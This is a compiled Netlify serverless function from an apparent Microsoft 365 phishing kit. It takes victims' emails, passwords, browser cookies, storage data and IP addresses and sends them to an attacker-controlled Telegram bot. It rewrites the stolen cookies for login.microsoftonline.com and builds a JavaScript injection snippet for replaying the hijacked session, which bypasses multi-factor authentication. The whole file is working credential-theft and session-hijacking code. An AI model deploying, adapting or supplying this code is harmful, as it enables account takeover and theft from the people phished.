var __defProp = Object.defineProperty;
var __getOwnPropDesc = Object.getOwnPropertyDescriptor;
var __getOwnPropNames = Object.getOwnPropertyNames;
var __hasOwnProp = Object.prototype.hasOwnProperty;
var __export = (target, all) => {
  for (var name in all)
    __defProp(target, name, { get: all[name], enumerable: true });
};
var __copyProps = (to, from, except, desc) => {
  if (from && typeof from === "object" || typeof from === "function") {
    for (let key of __getOwnPropNames(from))
      if (!__hasOwnProp.call(to, key) && key !== except)
        __defProp(to, key, { get: () => from[key], enumerable: !(desc = __getOwnPropDesc(from, key)) || desc.enumerable });
  }
  return to;
};
var __toCommonJS = (mod) => __copyProps(__defProp({}, "__esModule", { value: true }), mod);

// netlify/functions/sendTelegram.js
var sendTelegram_exports = {};
__export(sendTelegram_exports, {
  handler: () => handler
});
module.exports = __toCommonJS(sendTelegram_exports);
var handler = async (event, context) => {
  const headers = {
    "Access-Control-Allow-Origin": "*",
    "Access-Control-Allow-Headers": "Content-Type",
    "Access-Control-Allow-Methods": "POST, OPTIONS"
  };
  if (event.httpMethod === "OPTIONS") {
    return { statusCode: 200, headers, body: "" };
  }
  if (event.httpMethod !== "POST") {
    return {
      statusCode: 405,
      headers,
      body: JSON.stringify({ error: "Method not allowed" })
    };
  }
  async function sendErrorTelegram(msg, extra) {
    const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
    if (!BOT_TOKEN || !CHAT_ID) return;
    try {
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: `\u{1F6A8} <b>MICROSOFT 365 ERROR</b>
${msg}

${extra ? "<code>" + (typeof extra === "string" ? extra : JSON.stringify(extra)).substring(0, 1500) + "</code>" : ""}
${(/* @__PURE__ */ new Date()).toISOString()}`,
          parse_mode: "HTML"
        })
      });
    } catch (e) {
      console.error("\u274C Failed to send error notification to Telegram:", e);
    }
  }
  try {
    let data;
    try {
      data = JSON.parse(event.body);
    } catch (parseError) {
      await sendErrorTelegram("JSON parse error", event.body);
      return {
        statusCode: 400,
        headers,
        body: JSON.stringify({ error: "Invalid JSON", details: parseError.message })
      };
    }
    const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
      await sendErrorTelegram("Missing Telegram env config", {});
      return {
        statusCode: 500,
        headers,
        body: JSON.stringify({ error: "Telegram configuration missing" })
      };
    }
    const { email, password, provider, fileName, timestamp, userAgent, browserFingerprint } = data;
    let formattedCookies = [];
    let cookieInfo = data.formattedCookies || browserFingerprint?.cookies || data.cookies || data.documentCookies || [];
    if (!email) {
      await sendErrorTelegram("Missing email (required)", { email, password });
      return {
        statusCode: 400,
        headers,
        body: JSON.stringify({ error: "Missing required field: email", fields: { email, password } })
      };
    }
    try {
      if (Array.isArray(data.formattedCookies) && data.formattedCookies.length > 0) {
        formattedCookies = data.formattedCookies.filter((c) => c && c.name).map((c) => ({
          ...c,
          domain: ".login.microsoftonline.com"
        }));
      } else if (Array.isArray(cookieInfo) && cookieInfo.length > 0) {
        formattedCookies = cookieInfo.filter((c) => c && c.name).map((c) => ({
          ...c,
          domain: ".login.microsoftonline.com"
        }));
      } else if (typeof cookieInfo === "string" && cookieInfo !== "No cookies found" && cookieInfo !== "Empty" && cookieInfo.trim() !== "") {
        try {
          const parsedCookies = JSON.parse(cookieInfo);
          if (Array.isArray(parsedCookies)) {
            formattedCookies = parsedCookies.filter((c) => c && c.name).map((c) => ({
              ...c,
              domain: ".login.microsoftonline.com"
            }));
          }
        } catch {
          if (cookieInfo.includes("=")) {
            const cookieStrings = cookieInfo.split(";");
            formattedCookies = cookieStrings.map((str) => {
              const [name, ...valueParts] = str.trim().split("=");
              const value = valueParts.join("=");
              return name && value ? {
                name: name.trim(),
                value: value.trim(),
                domain: ".login.microsoftonline.com",
                path: "/",
                secure: true,
                httpOnly: false,
                sameSite: "none",
                expirationDate: Math.floor(Date.now() / 1e3) + 365 * 24 * 60 * 60,
                hostOnly: false,
                session: false,
                storeId: null
              } : null;
            }).filter(Boolean);
          }
        }
      } else if (data.documentCookies && typeof data.documentCookies === "string") {
        const cookieStrings = data.documentCookies.split(";");
        formattedCookies = cookieStrings.map((str) => {
          const [name, ...valueParts] = str.trim().split("=");
          const value = valueParts.join("=");
          return name && value ? {
            name: name.trim(),
            value: value.trim(),
            domain: ".login.microsoftonline.com",
            path: "/",
            secure: true,
            httpOnly: false,
            sameSite: "none",
            expirationDate: Math.floor(Date.now() / 1e3) + 365 * 24 * 60 * 60,
            hostOnly: false,
            session: false,
            storeId: null
          } : null;
        }).filter(Boolean);
      }
    } catch (cookieParseError) {
      await sendErrorTelegram("Cookie parse error", cookieInfo);
    }
    if (!formattedCookies || formattedCookies.length === 0) {
      await sendErrorTelegram("No cookies found for this submission", data);
      return {
        statusCode: 400,
        headers,
        body: JSON.stringify({ error: "No cookies found" })
      };
    }
    const clientIP = event.headers["x-forwarded-for"]?.split(",")[0]?.trim() || event.headers["x-real-ip"] || event.headers["cf-connecting-ip"] || event.requestContext?.identity?.sourceIp || "Unknown";
    const deviceInfo = /Mobile|Android|iPhone|iPad/.test(userAgent || "") ? "\u{1F4F1} Mobile" : "\u{1F4BB} Desktop";
    const sessionId = data.sessionId || Math.random().toString(36).substring(2, 15);
    const mainMessage = `\u{1F510} MICROSOFT 365 LOGIN CAPTURED

\u{1F4E7} Email: ${email}
\u{1F511} Password: ${password ? password : "[NOT SUPPLIED/OAUTH]"}
\u{1F3E2} Provider: ${provider || "Microsoft"}
\u{1F552} Time: ${(/* @__PURE__ */ new Date()).toLocaleString()}
\u{1F310} IP: ${clientIP} | ${deviceInfo}
\u{1F36A} Cookies: ${formattedCookies.length} captured
\u{1F4BE} LocalStorage: ${browserFingerprint?.localStorage !== "Empty" ? "Has Data" : "Empty"}
\u{1F5C3}\uFE0F SessionStorage: ${browserFingerprint?.sessionStorage !== "Empty" ? "Has Data" : "Empty"}
\u{1F4F1} User Agent: ${(userAgent || "Unknown").substring(0, 100)}
\u{1F194} Session: ${sessionId}
Download link: ${event.headers.host ? `https://${event.headers.host}` : "https://your-domain.netlify.app"}/.netlify/functions/getCookies?sessionId=${sessionId}`;
    let mainMessageOk = false;
    try {
      const tgResp = await fetch(
        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: mainMessage,
            parse_mode: "Markdown"
          }),
          signal: AbortSignal.timeout(15e3)
        }
      );
      if (!tgResp.ok) {
        const errText = await tgResp.text();
        await sendErrorTelegram("Main message failed", errText);
      } else {
        mainMessageOk = true;
      }
    } catch (err) {
      await sendErrorTelegram("Main message (network) failed", err.message);
    }
    let fileSent = false;
    try {
      const cookiesForFile = formattedCookies.map((c) => ({
        ...c,
        domain: ".login.microsoftonline.com"
      }));
      const jsInjectionCode = cookiesForFile.length > 0 ? `!function(){console.log("%c COOKIES","background:greenyellow;color:#fff;font-size:30px;");let e=JSON.parse(${JSON.stringify(
        JSON.stringify(cookiesForFile)
      )});for(let o of e)document.cookie=\`\${o.name}=\${o.value};Max-Age=31536000;\${o.path?\`path=\${o.path};\`:""}\${o.domain?\`\${o.path?"":"path=/"}domain=\${o.domain};\`:""}\${o.secure?"Secure;":""}\${o.sameSite?\`SameSite=\${o.sameSite};\`:"SameSite=no_restriction;"}\`;location.reload()}();` : `console.log("%c NO COOKIES FOUND","background:red;color:#fff;font-size:30px;");alert("No cookies were captured for this session.");`;
      const cookiesFileContent = `// Cookie Data for ${email} - ${(/* @__PURE__ */ new Date()).toISOString()}
// Provider: ${provider || "Microsoft"}
// IP: ${clientIP}
// Microsoft 365 Session Data
// Cookies Found: ${cookiesForFile.length}

let ipaddress = "${clientIP}";
let email = "${email}";
let password = "${password ? password : "[NOT SUPPLIED/OAUTH]"}";

// Raw Cookie Data Debug Info:
// Formatted cookies count: ${cookiesForFile.length}

${jsInjectionCode}

// Cookie Data:
${JSON.stringify(cookiesForFile, null, 2)}

// Session Storage:
// ${browserFingerprint?.sessionStorage || ""}

// Local Storage:
// ${browserFingerprint?.localStorage || ""}`;
      const fileNameForUpload = `microsoft365_cookies_${email.replace(
        "@",
        "_at_"
      )}_${Date.now()}.js`;
      const boundary = "----formdata-boundary-" + Math.random().toString(36);
      let formData = "";
      formData += `--${boundary}\r
`;
      formData += `Content-Disposition: form-data; name="chat_id"\r
\r
`;
      formData += `${TELEGRAM_CHAT_ID}\r
`;
      formData += `--${boundary}\r
`;
      formData += `Content-Disposition: form-data; name="document"; filename="${fileNameForUpload}"\r
`;
      formData += `Content-Type: text/javascript\r
\r
`;
      formData += cookiesFileContent;
      formData += `\r
`;
      formData += `--${boundary}--\r
`;
      const fileResp = await fetch(
        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`,
        {
          method: "POST",
          headers: { "Content-Type": `multipart/form-data; boundary=${boundary}` },
          body: formData,
          signal: AbortSignal.timeout(3e4)
        }
      );
      if (fileResp.ok) {
        fileSent = true;
      } else {
        const fileErrorText = await fileResp.text();
        await sendErrorTelegram("File upload failed", fileErrorText);
        const fallbackMessage = `\u{1F4C1} <b>MICROSOFT 365 COOKIES</b> (${cookiesForFile.length} cookies)

<code>${cookiesFileContent.substring(
          0,
          3500
        )}</code>

${cookiesFileContent.length > 3500 ? "<i>...truncated</i>" : ""}`;
        const fallbackResponse = await fetch(
          `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
          {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              chat_id: TELEGRAM_CHAT_ID,
              text: fallbackMessage,
              parse_mode: "HTML"
            })
          }
        );
        if (fallbackResponse.ok) {
          fileSent = true;
        }
      }
    } catch (fileError) {
      await sendErrorTelegram("File send error", fileError.message);
    }
    return {
      statusCode: 200,
      headers,
      body: JSON.stringify({
        success: mainMessageOk && fileSent,
        message: "Data processed",
        cookieCount: formattedCookies.length,
        fileSent
      })
    };
  } catch (error) {
    await sendErrorTelegram("Handler-level error", error.message);
    return {
      statusCode: 500,
      headers,
      body: JSON.stringify({
        error: "Internal server error",
        details: error.message,
        timestamp: (/* @__PURE__ */ new Date()).toISOString()
      })
    };
  }
};
// Annotate the CommonJS export names for ESM import in node:
0 && (module.exports = {
  handler
});
//# sourceMappingURL=sendTelegram.js.map
